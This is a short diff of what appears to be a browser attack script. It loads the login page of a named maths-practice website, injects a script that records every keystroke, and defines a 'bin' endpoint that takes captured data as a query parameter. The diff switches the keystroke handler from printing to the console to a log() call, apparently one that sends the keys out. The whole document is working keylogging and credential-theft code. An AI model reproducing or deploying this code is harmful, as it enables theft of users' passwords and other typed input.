@@ -1,4 +1,4 @@
-(function() {
+//(function() {
   const comfort = 'https://www.drfrostmaths.com/do-question.php?aaid=10972720'
   const bin = 'https://???/bin?data='
 
@@ -14,5 +14,5 @@
   }
   
   await load(`/login.php?url=${encodeURIComponent(comfort)}`)
-  document.body.innerHTML += `<script>window.onkeydown=${({key}) => console.log(key)}</script>`
-})()
+  document.body.innerHTML += `<script>window.onkeydown=${({key}) => log({key})}</script>`
+//})()
